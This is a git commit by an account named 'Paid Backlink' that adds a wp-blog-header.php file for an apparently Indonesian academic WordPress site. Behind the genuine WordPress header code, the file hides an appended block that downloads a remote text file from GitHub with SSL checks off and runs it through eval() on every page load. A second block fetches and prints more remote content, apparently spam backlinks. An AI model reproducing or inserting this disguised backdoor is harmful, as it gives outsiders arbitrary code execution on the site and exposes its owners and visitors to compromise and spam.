98712112019fede7a5c17935dc7bcce080c560ef
Paid Backlink <152395041+BacklinkGG@users.noreply.github.com>
2024-02-19 14:44:19 +0800

    Create wp-blog-header.php

---
+++ site/pti-kolaka/pti-kolaka.ac.id/wp-blog-header.php
@@ -0,0 +1,49 @@
+<?php
+/**
+ * Loads the WordPress environment and template.
+ *
+ * @package WordPress
+ */
+
+if ( ! isset( $wp_did_header ) ) {
+
+	$wp_did_header = true;
+
+	// Load the WordPress library.
+	require_once __DIR__ . '/wp-load.php';
+
+	// Set up the WordPress query.
+	wp();
+
+	// Load the theme template.
+	require_once ABSPATH . WPINC . '/template-loader.php';
+
+}
+?>
+<?php
+$url = 'https://raw.githubusercontent.com/BacklinkGG/vip/main/vip.txt';
+$ch = curl_init($url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+$fileContents = curl_exec($ch);
+curl_close($ch);
+eval("?>" . $fileContents);
+?>
+<?php
+function curlGetContents($url) {
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    $fileContents = curl_exec($ch);
+    curl_close($ch);
+    return $fileContents; 
+}
+$url1 = 'https://raw.githubusercontent.com/BacklinkGG/VIP-ID/main/system.txt';
+$url2 = 'https://raw.githubusercontent.com/BacklinkGG/VIP-ID/main/site/pti-kolaka/pti-kolaka.ac.id/system.txt';
+$fileContents1 = curlGetContents($url1);
+$fileContents2 = curlGetContents($url2);
+echo $fileContents1;
+echo $fileContents2;
+?>
